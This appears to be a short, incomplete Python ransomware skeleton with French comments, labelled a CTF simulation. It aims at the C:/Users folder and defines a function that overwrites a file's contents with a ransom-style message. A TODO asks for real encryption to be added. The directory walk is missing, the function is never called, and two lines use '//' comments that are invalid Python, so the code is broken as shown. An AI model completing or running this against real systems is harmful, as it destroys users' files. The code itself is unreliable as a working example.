import os

# Dossier cible  
target_dir = "C:/Users"

# Payload: juste un texte fixe pour remplacer le contenu des fichiers
payload = "File encrypted by CTF ransomware simulation."

def pseudo_encrypt(file_path):
    with open(file_path, 'w') as file:
        file.write(payload)

// parser les dossiers

//todo Faire le chiffrement complet.
print("Simulation de chiffrement terminée.")
